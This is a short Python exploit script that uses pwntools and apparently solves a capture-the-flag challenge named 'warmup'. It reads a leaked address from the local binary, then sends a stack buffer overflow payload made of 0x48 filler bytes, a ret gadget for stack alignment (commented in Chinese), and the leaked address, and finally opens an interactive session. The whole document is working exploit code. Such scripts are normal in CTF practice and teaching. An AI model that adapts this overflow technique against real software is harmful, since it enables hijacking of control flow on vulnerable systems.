from pwn import *

def debug(argv=''):
    gdb.attach(io, argv)
    pause()

io = process(argv=['./warmup'])

context.log_level = 'debug'
context.arch = 'amd64'

io.readline() # read warm up
addr = io.readline()[4:-1]
log.info(addr.decode('utf-8'))

#  debug('b * main')

ret_addr = 0x04004a1 # 栈对齐

payload = flat([b'@'*(0x40+8), ret_addr,int(addr,16)])

io.sendline(payload)

io.interactive()
